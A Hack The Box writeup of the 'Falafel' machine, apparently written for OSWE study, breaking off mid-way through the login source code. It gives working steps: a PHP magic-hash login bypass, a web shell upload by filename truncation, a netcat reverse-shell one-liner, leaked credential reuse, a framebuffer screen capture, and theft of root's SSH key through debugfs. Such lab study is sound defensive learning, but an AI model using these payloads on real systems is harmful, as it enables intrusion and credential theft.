---
layout: post
title:  "Hack The Box - Falafel - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Falafel-Writeup" %}

# Introduction
The hack the box machine "Falafel" is a hard machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of PHP type juggling vulnerabilities, insecure file uploads, capabilities of different Linux groups and framebuffers.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover a web application and an SSH service. The web application contains a login prompt which is vulnerable to PHP type juggling. It is possible to exploit this vulnerability to cause a password hash collision and authenticate as the `admin` user. Thereafter, a file upload feature can be exploited to upload a PHP web shell and obtain code execution as the `www-data` user. 

By inspecting the content of the web application's PHP files, it is possible to find the password of a user named "Moshe". These credentials can then be used to login over SSH as the `moshe` user. It can then be discovered that this user is a member of the `video` group and that another user named "Yossi" is logged in on the target. The permissions of the `video` group can be abused to take a screenshot of the `yossi` user's screen, which reveals his password. After logging in as `yossi` over SSH, we can discover that the `yossi` user is a member of the `disk` group which can read any file on the hard drive. This permission can be abused to read the private SSH key of the `root` user which can then be used to log in as the `root` user!

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.73`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we see SSH on port 22 and a web server on port 80.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sS -sC -sV -p- 10.10.10.73@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 08:44 EDT
Nmap scan report for 10.10.10.73
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
@@@22/tcp open  ssh@@@     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
@@@80/tcp open  http@@@    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Falafel Lovers
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.24 seconds
{% endhighlight %} 

If we navigate to the web server in a browser, we are met with the page below. It doesn't contain much except for a `Login` button which leads to a login page and a link named "Home" which leads to the page we are already on. Since the link to the login page [http://10.10.10.73/login.php](http://10.10.10.73/login.php) has the extension `.php`, we know that we are dealing with a PHP application.

![indexPHP](/assets/{{ imgDir }}/indexPHP.png)

![loginPHP](/assets/{{ imgDir }}/loginPHP.png)

We can use [ffuf](https://github.com/ffuf/ffuf) to guess directory and file names, as shown below. We specify the target host with the `-u` flag, specify file extensions with the `-e` flag, choose a wordlist using the `-w` flag and set the `-ic` flag to instruct the tool to ignore comments in the wordlist file.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@ffuf -u http://10.10.10.73/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt@@

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.73/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

login.php               [Status: 200, Size: 7063, Words: 878, Lines: 103]
profile.php             [Status: 302, Size: 9787, Words: 1292, Lines: 259]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 288, Words: 10, Lines: 18]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 7203, Words: 774, Lines: 110]
footer.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
@@@upload.php@@@              [Status: @@@302@@@, Size: 0, Words: 1, Lines: 1]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
style.php               [Status: 200, Size: 6174, Words: 690, Lines: 69]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
@@@cyberlaw.txt@@@            [Status: @@@200@@@, Size: @@@804@@@, Words: 106, Lines: 18]
connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
:: Progress: [661641/661641] :: Job [1/1] :: 691 req/sec :: Duration: [0:15:57] :: Errors: 0 ::
{% endhighlight %}

Visiting the pages which resulted in a `302 Found`, causes a redirection to the login page. Out of the remaining pages, we can ignore anything that results in a `403 Forbidden` or has a size of 0 bytes. The `header.php` and `footer.php` pages contain the header and footer of the website. These two PHP pages are not meant to be loaded on their own. Rather, they are meant to be included in other PHP pages. Similarly, the `style.php` file contains styling for the website and is a file which is used by other PHP files. Furthermore, visiting the `robots.txt` page does not result in any interesting information about any hidden directories or files.

There are two pages that could be interesting to us. The first one is `cyberlaw.txt` since it resulted in a `200 OK` response which is not empty. The second one is `upload.php` since the name suggests that it allows users to upload files, meaning that we could potentially use this page to obtain RCE. However, we would first need to have access to a valid account to access this functionality.

Navigating to [http://10.10.10.73/cyberlaw.txt](http://10.10.10.73/cyberlaw.txt) results in the page below. This page contains an email stating that there is a known problem with the authentication of the website and that there is an issue with a file upload feature which might lead to remote code execution on the target. In addition, it informs us that `admin` and `chris` might be valid usernames.

![cyberLawTXT](/assets/{{ imgDir }}/cyberLawTXT.png)

Since we know that the web application is a PHP application and that authentication mechanisms typically check if a set of credentials equals another set of credentials, we could investigate if the authentication mechanism is vulnerable to type juggling attacks. A type juggling vulnerability occurs when a loose comparison `==` is performed when a strict comparison `===` should have been used. The difference is that loose comparisons will sometimes make PHP cast one of the parameters which it should compare, to another data type. For example, if we try to loosely compare a string with the integer `0`, the result is `true`. However, if we perform this comparison as a strict comparison, the result is `false`. A more detailed explanation of the differences between loose and strict comparisons can be found in [the official PHP documentation](https://www.php.net/manual/en/types.comparisons.php). 

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@php -a@@
Interactive mode enabled

php > @@var_dump("test"==0);@@
bool(@@@true@@@)
php > @@var_dump("test"===0);@@
bool(@@@false@@@)
{% endhighlight %}

It is common for authentication mechanism to hash a provided password and compare the resulting password hash with a password hash stored in a database. If this is done using loose comparison, there is a risk that the comparison would evaluate to `true` for different passwords. This can occur if PHP tries to convert the password hashes to a float before comparing them. This typically happens when the strings to compare start with one or more `0` characters, the character `e` followed by one or more numeric characters. For example, `0e1234`  would be interpreted as a float representing the value `0`. Similarly, `00000e1234` would also be interpreted as a float representing the value `0`. As such, comparing these two strings would result in `true`.

A hash which PHP would interpret as a `0` valued float is commonly referred to as a magic hash. The table below lists magic hashes for different hash algorithms together with the input to these hash algorithms. Assuming that the stored password hash of one of our two compromised users is a magic hash and that the authentication check is performed using a loose comparison between the calculated password hash and the stored password hash, we could potentially be able to authenticate as this user by using one of the values in the `Input` column as a password.

<div style="overflow-x:auto;">
<table class="customTable"><tr><th>Hash Type</th><th>Hash Length</th><th>Input</th><th>Magic Hash</th></tr>
<tr><td>MD2</td><td>32</td><td>505144726</td><td>0e015339760548602306096794382326</td></tr>
<tr><td>MD4</td><td>32</td><td>48291204</td><td>0e266546927425668450445617970135</td></tr>
<tr><td>MD5</td><td>32</td><td>240610708</td><td>0e462097431906509019562988736854</td></tr>
<tr><td>SHA-1</td><td>40</td><td>10932435112</td><td>0e07766915004133176347055865026311692244</td></tr>
</table>
</div>

![adminLogin](/assets/{{ imgDir }}/adminLogin.png)

<div id="login"></div>
We can use the `login.php` page to try to authenticate with one of the usernames `chris` and `admin` together with a password in the `Input` field of the table. Upon trying each of these combinations, we can conclude that we can not log in with the username `chris` together with any of the passwords. However, we can log in with the username `admin` and password `240610708`! This leads us to the `Upload` page below.

![loginSuccess](/assets/{{ imgDir }}/loginSuccess.png)

What has happened is that the authentication portion of the code uses a loose comparison with the format `storedPasswordHash == md5(receivedPassword)` where `storedPasswordHash` is the stored password hash for the admin user and `receivedPassword` is the password we provided. If `storedPasswordHash` can be casted to a float with a numeric value of `0`, we would pass the authentication check since we know that `md5(receivedPassword)` becomes `0e462097431906509019562988736854` and loose comparison is used. For example, if we assume that `storedPasswordHash` is `0e12345678123456781234567812345678`, the comparison would result in `true`, as can be seen below. For an analysis of exactly what has happened in the source code, see the [extra]({{path}}#extra) section at the end of this page.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@php -a@@
Interactive mode enabled

php > @@var_dump("0e12345678123456781234567812345678"=="0e462097431906509019562988736854");@@
bool(@@@true@@@)
php > 
{% endhighlight %}

{% highlight php linenos %}
<?php $cmd = system($_REQUEST["cmd"]); ?>
{% endhighlight %}

The `Upload` page let's a user submit a URL to a file which the target then uses to download this file. We can start a Python web server by executing `python3 -m http.server 80` and try to trick the target into downloading malicious files from this web server. For example, we could try to trick it into downloading the PHP web shell shown above.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@echo '<?php $cmd = system($_REQUEST["cmd"]); ?>' > webShell.php@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo python3 -m http.server 80@@
@@@Serving HTTP on 0.0.0.0 port 80@@@ (http://0.0.0.0:80/) ...
{% endhighlight %}

After our Python web server has started, we go back to the browser and submit the URL `http://[IP]/webShell.php`, where `[IP]` is our IP address. Upon submitting this URL, we are informed that the file we are linking to has a bad file extension.

![badExtension](/assets/{{ imgDir }}/badExtension.png)

We can execute `mv webShell.php webShell.php.png` to append the extension `.png` to our web shell file. If we submit a URL to this file, the target successfully downloads it, meaning that `.png` is an allowed extension. We can also see what command the target host executed to download the file. We can conclude that the target uses the `wget` tool to download files. 

![uploadPNG](/assets/{{ imgDir }}/uploadPNG.png)

The `wget` tool has a built-in limitation on filename lengths of 236 characters. If a filename is longer than 236 characters, only the first 236 characters will be included in the filename. In addition, we can strongly suspect that the extension filter is applied before the file is downloaded to disk, since file extension filters are normally applied before a file is written to disk. As such, we can try to upload a file with a name that consists of 232 `A` characters followed by `.php.png`. This should pass the extension filter but save the file with the extension `.php`. If we submit a URL to this new file, we obtain the output below. 

![uploadWS](/assets/{{ imgDir }}/uploadWS.png)

From the output, we can see that the file was uploaded to the directory `/var/www/uploads/0318-1557_d779068805ae58df/` and with the original name except for the `.png` extension! We can verify that we have code execution by using the web shell to run a command such as `pwd`. This can be performed by visiting [http://10.10.10.73/uploads/0318-1557_d779068805ae58df/[232A].php?cmd=pwd](http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd) where `[232A]` should be 232 `A` characters. Upon visiting this link, the current directory is displayed.

![RCE](/assets/{{ imgDir }}/RCE.png)

The next step is to obtain an interactive shell on the target rather than a web shell. We can do this by starting a listener and executing the reverse shell payload below.
{% highlight none linenos %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.7 443 >/tmp/f
{% endhighlight %}

However, to prevent the web application from interpreting any special characters in the wrong way, we can URL-encode the payload. This can be performed using Burp Suite's Decoder tool as demonstrated below.

![urlEncode](/assets/{{ imgDir }}/urlEncode.png)

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nc -lvp 443@@
listening on [any] 443 ...
10.10.10.73: inverse host lookup failed: Unknown host
@@@connect to [10.10.16.7] from (UNKNOWN) [10.10.10.73] 60458@@@
sh: 0: can't access tty; job control turned off
$ @@whoami@@
@@@www-data@@@
{% endhighlight %}

Next, we execute `nc -lvp 443` to start a netcat listener and execute the URL-encoded payload using the web shell. Once the server has processed the request, the server connects back to our listener and provides us with a shell as the `www-data` user, as can be seen above. The next step is to escalate our privileges!

# Privilege Escalation

When we were uploading files, we discovered that the web server root was `/var/www/html`. Now that we have a shell as `www-data`, we can list files in this directory and read their content. One of the files in this directory is `connection.php` which contains credentials for connecting to a database.
{% highlight none linenos %}
$ @@ls /var/www/html@@
assets
authorized.php
@@@connection.php@@@
css
cyberlaw.txt
footer.php
header.php
icon.png
images
index.php
js
login.php
login_logic.php
logout.php
profile.php
robots.txt
style.php
upload.php
uploads
$ @@cat /var/www/html/connection.php@@
<?php
   define('DB_SERVER', 'localhost:3306');
   define('@@@DB_USERNAME@@@', '@@@moshe@@@');
   define('@@@DB_PASSWORD@@@', '@@@falafelIsReallyTasty@@@');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
$ 
{% endhighlight %}

When we were scanning the target with nmap, we discovered that SSH was available on port 22. We can attempt to login with the database credentials as demonstrated below.

{% highlight none linenos %}
kali@kali:~$ @@ssh moshe@10.10.10.73@@
moshe@10.10.10.73's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
$
{% endhighlight %}

Luckily, the database credentials work and we obtain a shell as the `moshe` user. If we execute `w`, we see that the `yossi` user is also logged in on the target host. By executing `groups`, we can list the groups of the `moshe` user and discover that this user is a member of the `video` group. The `video` group usually has access to video devices and memory segments of these devices. For example, this includes framebuffers which are portions of RAM that contains the next frame which should be displayed on a physical monitor. If the `yossi` user is physically present in front of the computer, we might be able to take a screenshot of his screen to see what he is doing.

{% highlight none linenos %}
$ @@w@@
 19:56:03 up 13 min,  2 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@@yossi@@@    tty1                      19:42   13:38   0.07s  0.06s -bash
moshe    pts/0    10.10.16.7       19:56    2.00s  0.00s  0.00s w
$ @@groups@@
moshe adm mail news voice floppy audio @@@video@@@ games
$
{% endhighlight %}

In Linux, there is one framebuffer for each monitor and each framebuffer is normally represented by a [character device](https://en.wikipedia.org/wiki/Device_file#Character_devices) in the `/dev/` directory. They are normally named `fb[x]`, where `[x]` is the index of the framebuffer starting at `0`. If we try to list all framebuffers on the target, we discover that there is only one framebuffer and that we have access to it!

{% highlight none linenos %}
$ @@ls -l /dev/fb*@@
crw-@@@rw@@@---- 1 root @@@video@@@ 29, 0 May  1 19:42 @@@/dev/fb0@@@
$
{% endhighlight %}

We can extract a frame from the framebuffer by copying the content of the framebuffer to a file, as demonstrated below. In addition, we can obtain the screen resolution by reading the content of the file `/sys/class/graphics/fb0/virtual_size`. This will be useful later on when we try to convert this frame to an image format which we can display.

{% highlight none linenos %}
$ @@cat /dev/fb0 > /tmp/screenshot.raw@@
$ @@cat /sys/class/graphics/fb0/virtual_size@@
@@@1176,885@@@
$
{% endhighlight %}

Once we have extracted a frame and saved it to the file `/tmp/screenshot.raw`, we can download it using `scp`.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@scp moshe@10.10.10.73:/tmp/screenshot.raw ./screenshot.raw@@
moshe@10.10.10.73's password: 
@@@screenshot.raw                                                                    100%@@@ 4065KB   2.4MB/s   00:01    
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

We can use `ffmpeg` to convert the captured frame to a displayable image format such as `JPEG`. We do this by executing `ffmpeg -pix_fmt [pixelFormat] -s 1176x885 -f rawvideo -i screenshot.raw -f singlejpeg screenshot.jpg` where `[pixelFormat]` is the [pixel format](https://en.wikipedia.org/wiki/Pixel_Format) we want. A pixel format defines how a sequence of bits should be grouped into pixels. For example, it could define that each pixel is represented by 8 bits for each of the three colors red, green and blue.

The `-s` flag is used to specify the width and height of the frame. Then, we use the `-f` and `-i` flags to point `ffmpeg` to the `screenshot.raw` file and instruct it that this file is in the `rawvideo` format. Thereafter, we use the `-f` flag again to specify that the output file should be a `JPEG` file. Note that we use the `-f` flag twice since it only applies to the subsequent file which is specified as an argument to `ffmpeg`.

The only thing the command is missing is the pixel format. We can list all available pixel formats using the `-pix_fmts` flag, as demonstrated below.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ffmpeg -pix_fmts@@                                                                       
[...]
Pixel formats:
I.... = Supported Input  format for conversion
.O... = Supported Output format for conversion
..H.. = Hardware accelerated format
...P. = Paletted format
....B = Bitstream format
FLAGS NAME            NB_COMPONENTS BITS_PER_PIXEL
-----
IO... yuv420p                3            12
IO... yuyv422                3            16
IO... rgb24                  3            24
IO... bgr24                  3            24
IO... yuv422p                3            16
IO... yuv444p                3            24
IO... yuv410p                3             9
IO... yuv411p                3            12
IO... gray                   1             8
IO..B monow                  1             1
IO..B monob                  1             1
I..P. pal8                   1             8
IO... yuvj420p               3            12
IO... yuvj422p               3            16
IO... yuvj444p               3            24
IO... uyvy422                3            16
..... uyyvyy411              3            12
IO... bgr8                   3             8
.O..B bgr4                   3             4
IO... bgr4_byte              3             4
IO... rgb8                   3             8
.O..B rgb4                   3             4
IO... rgb4_byte              3             4
IO... nv12                   3            12
IO... nv21                   3            12
IO... argb                   4            32
IO... rgba                   4            32
[...]
{% endhighlight %}

Since we don't know which one to use, we can execute the command once for each pixel format. This results in a set of images which are shown in the video below. 

<video width="100%" controls="controls">
  <source src="/assets/{{ imgDir }}/pixelFormats.mp4" type="video/mp4">
</video>


One of the pixel formats which results in a clear picture is `0rgb`. Generating a `JPEG` using this pixel format can be performed as demonstrated below.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -f singlejpeg screenshot.jpg@@
ffmpeg version 4.4.1-3+b2 Copyright (c) 2000-2021 the FFmpeg developers
  built with gcc 11 (Debian 11.2.0-18)
  configuration: --prefix=/usr --extra-version=3+b2 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared
  libavutil      56. 70.100 / 56. 70.100
  libavcodec     58.134.100 / 58.134.100
  libavformat    58. 76.100 / 58. 76.100
  libavdevice    58. 13.100 / 58. 13.100
  libavfilter     7.110.100 /  7.110.100
  libswscale      5.  9.100 /  5.  9.100
  libswresample   3.  9.100 /  3.  9.100
  libpostproc    55.  9.100 / 55.  9.100
[rawvideo @ 0x56212015f700] Estimating duration from bitrate, this may be inaccurate
Input #0, rawvideo, from 'screenshot.raw':
  Duration: 00:00:00.04, start: 0.000000, bitrate: 832608 kb/s
  Stream #0:0: Video: rawvideo ([0]RGB / 0x42475200), 0rgb, 1176x885, 832608 kb/s, 25 tbr, 25 tbn, 25 tbc
Stream mapping:
  @@@Stream #0@@@:0 -> #0:0 (@@@rawvideo@@@ (native) -> @@@mjpeg@@@ (native))
Press [q] to stop, [?] for help
[swscaler @ 0x562120178740] deprecated pixel format used, make sure you did set range correctly
@@@Output #0, singlejpeg, to 'screenshot.jpg'@@@:
  Metadata:
    encoder         : Lavf58.76.100
  Stream #0:0: Video: mjpeg, yuvj444p(pc, progressive), 1176x885, q=2-31, 200 kb/s, 25 fps, 25 tbn
    Metadata:
      encoder         : Lavc58.134.100 mjpeg
    Side data:
      cpb: bitrate max/min/avg: 0/0/200000 buffer size: 0 vbv_delay: N/A
frame=    1 fps=0.0 q=5.7 Lsize=      46kB time=00:00:00.04 bitrate=9339.0kbits/s speed= 1.7x    
video:46kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@xdg-open screenshot.jpg@@
{% endhighlight %}

From the output of the command, we can see that the tool converts the frame to the `mjpeg` format. Then, it uses this data to create a single `JPEG` image which is saved in a file named "screenshot.jpg". If we open this file using `xdg-open`, we see that the `yossi` user is trying to use the `passwd` command to change the password of his account. The first time, however, he mistakenly typed his password in cleartext. Although we can't see what password he set in his successful attempt, we can strongly suspect that it is `MoshePlzStopHackingMe!`.

![screenshot](/assets/{{ imgDir }}/screenshot.png)

We can attempt to authenticate as `yossi` over SSH using this password. Upon doing so, we discover that the password is correct and that we obtain a shell as `yossi`!

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ssh yossi@10.10.10.73@@
yossi@10.10.10.73's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sun May  1 19:42:33 2022
yossi@falafel:~$ @@groups@@
yossi adm @@@disk@@@ cdrom dip plugdev lpadmin sambashare
yossi@falafel:~$
{% endhighlight %}

If we check the groups of the `yossi` user, we discover that this user is a member of the `disk` group. This is interesting since members of the `disk` group can read and alter any files on any hard drives. We could abuse this to read sensitive files which could, for example, contain credentials for the `root` user. By executing `df`, we can list what hard drives are available on the target host. 

{% highlight none linenos %}
yossi@falafel:~$ @@df@@
Filesystem     1K-blocks    Used Available Use% Mounted on
udev              487824       0    487824   0% /dev
tmpfs             101604    4656     96948   5% /run
@@@/dev/sda1@@@        7092728 2354532   4354864  36% /
tmpfs             508008       0    508008   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs             508008       0    508008   0% /sys/fs/cgroup
tmpfs             101604       0    101604   0% /run/user/1000
yossi@falafel:~$
{% endhighlight %}

From the output of this command, we find that there is only one hard drive located at `/dev/sda1`. We can access this hard drive using `debugfs`, which lets us list directories and copy files, among other things. We proceed to check if the `root` user has any SSH keys by executing `ls -l /root/.ssh`. We find a private key which we can copy to `/tmp/id_rsa` using `dump`. We do this since we don't have access to the original file but will have access to the copy of the file.

{% highlight none linenos %}
yossi@falafel:~$ @@debugfs /dev/sda1@@
debugfs 1.42.13 (17-May-2015)
debugfs:  @@ls -l /root/.ssh@@
 402797   40755 (2)      0      0    4096 15-Jan-2018 02:12 .
 262241   40750 (2)      0      0    4096  5-Feb-2018 17:04 ..
 402812  100600 (1)      0      0    1679 28-Nov-2017 23:01 @@@id_rsa@@@
 402822  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
 402824  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys
debugfs:  @@dump /root/.ssh/id_rsa /tmp/id_rsa@@
debugfs:  @@quit@@
yossi@falafel:~$
{% endhighlight %}

{% highlight none linenos %}
yossi@falafel:~$ @@cd /tmp@@
yossi@falafel:/tmp$ @@ls -l@@
total 4084
@@@-rw-------@@@ 1 @@@yossi@@@ @@@yossi@@@    1679 May  1 21:07 @@@id_rsa@@@
-rw-rw-r-- 1 moshe moshe 4163040 May  1 19:43 screenshot.raw
drwx------ 3 root  root     4096 May  1 19:42 systemd-private-d40e650d496c4e869d429f14c8dec8aa-systemd-timesyncd.service-vyIRsF                                                                                                         
drwx------ 2 root  root     4096 May  1 19:42 vmware-root
drwxrwxr-x 2 yossi yossi    4096 May  1 20:34 x
yossi@falafel:/tmp$ @@chmod 600 id_rsa@@
yossi@falafel:/tmp$ @@ssh -i ./id_rsa root@localhost@@
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.
Are you sure you want to continue connecting (yes/no)? @@yes@@
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
@@@root@@@@falafel:~# 
{% endhighlight %}
Next, we use `chmod` to change the permissions of the file to `600` as this is the appropariate permissions for SSH keys. We can then use this key to authenticate over SSH and obtian a shell as the `root` user!

<div id="extra"></div>

# Extra - Understanding the Type Juggling Vulnerability
Before gaining access to the `upload` page [earlier]({{path}}#login), we exploited a type juggling vulnerability to log in as the `admin` user. To better understand the type juggling vulnerability, we can analyze the source code of the application, which can be accessed using a shell as the `www-data` or `root` user. As we saw earlier, the web root is located at `/var/www/html`. We can navigate to this directory and leak the PHP code of the `login.php` page which we used to log in. Upon doing this, we discover that the `login.php` page includes the file `login_logic.php` which handles login attempts.

{% highlight none linenos %}
$ @@cd /var/www/html@@
$ @@ls@@
assets
authorized.php
connection.php
css
cyberlaw.txt
footer.php
header.php
icon.png
images
index.php
js
@@@login.php@@@
@@@login_logic.php@@@
logout.php
profile.php
robots.txt
style.php
upload.php
uploads
$ @@cat login.php@@
@@@<?php include("login_logic.php"); ?>@@@
<!DOCTYPE html>
<html> 
<head>
    <title>Falafel Lovers - Login Page</title>
    <?php include('style.php');?>    
</head>
<body>
<?php include('header.php');?>
  <div class="login">
    <h1>Login</h1>                                        
    <form action = "" method = "post">
        <label>Username  :</label><input type = "text" name = "username" class = "box"/><br /><br />
        <label>Password  :</label><input type = "password" name = "password" class = "box" /><br/><br />
        <button type="submit" class="btn btn-primary btn-block btn-large">Sumbit</button>
    </form>               
        <br>   
        <?php echo $message;?>
        </br>
   </body>
<?php include('footer.php');?>
</html>$ 
{% endhighlight %}

The content of the `login_logic.php` file is shown below. At line 4 to 5, the code checks if the request is a `POST` request and if credentials are provided. At line 12 to 13, the username and password are extracted from the login request and saved in the variables `$username` and `$password`. Then, at line 22, the `$password` variable is assigned the md5 hash of the user-supplied password. Next, at line 30 to 32, the row corresponding to the username `$username` is fetched from the `users` table in the database. The `if` statement at line 34 checks if a username matched a row. If this is the case, the `if` statement at line 35 performs a loose comparison between the stored password hash of the user and the password hash created from the user-supplied password. If this loose comparison evaluates to `true`, the user is logged in as the user specified in the `$username` variable. This is the loose comparison we exploited earlier to authenticate as the `admin` user!

{% highlight php linenos %}
<?php
  include("connection.php");
  session_start();
  if($_SERVER["REQUEST_METHOD"] == "POST") {
    if(!isset($_REQUEST['username'])&&!isset($_REQUEST['password'])){
      //header("refresh:1;url=login.php");
      $message="Invalid username/password.";
      //die($message);
      goto end;
          }

    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];

    if(!(is_string($username)&&is_string($password))){
      //header("refresh:1;url=login.php");
      $message="Invalid username/password.";
      //die($message);
      goto end;
    }

    $password = md5($password);
    $message = "";
    if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){
      $message="Hacking Attempt Detected!";
      //die($message);
      goto end;
    }

    $sql = "SELECT * FROM users WHERE username='$username'";
    $result = mysqli_query($db,$sql);
    $users = mysqli_fetch_assoc($result);
    mysqli_close($db);
    if($users) {
      if($password == $users['password']){
        if($users['role']=="admin"){         
